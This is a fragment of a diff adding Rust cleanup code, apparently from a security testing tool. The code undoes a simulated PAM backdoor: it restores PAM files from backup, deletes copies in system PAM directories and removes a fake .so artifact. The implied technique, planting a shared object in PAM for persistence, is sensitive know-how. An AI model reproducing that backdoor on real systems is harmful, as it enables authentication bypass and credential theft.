+                                match fs::copy(backup, pam_file) {
+                                    Ok(_) => info!(
+                                        "[OK] Restored {pam_file} from backup ({backup})"
+                                    ),
+                                    Err(e) => warn!(
+                                        "Failed to restore {pam_file} from backup: {e}"
+                                    ),
+                                }
+                            }
+                        }
+
+                        // Remove any successful copies in system PAM directories.
+                        if let Some(copies) = json["copy_attempts"].as_array() {
+                            for c in copies {
+                                if c["success"].as_bool().unwrap_or(false) {
+                                    if let Some(dest) = c["dest"].as_str() {
+                                        if Path::new(dest).exists() {
+                                            match fs::remove_file(dest) {
+                                                Ok(_) => info!(
+                                                    "[OK] Removed system-dir copy: {dest}"
+                                                ),
+                                                Err(e) => warn!(
+                                                    "Failed to remove {dest}: {e}"
+                                                ),
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Remove all artifact files (fake .so, backup, metadata).
+            for artifact in artifacts {
+                if Path::new(artifact).exists() {
+                    match fs::remove_file(artifact) {
+                        Ok(_) => info!("[OK] Removed artifact: {artifact}"),
+                        Err(e) => {
+                            warn!("Failed to remove artifact {artifact}: {e}")
+                        }
+                    }
+                }
+            }
+
+            info!("PAM backdoor cleanup complete");
             Ok(())
         })
     }
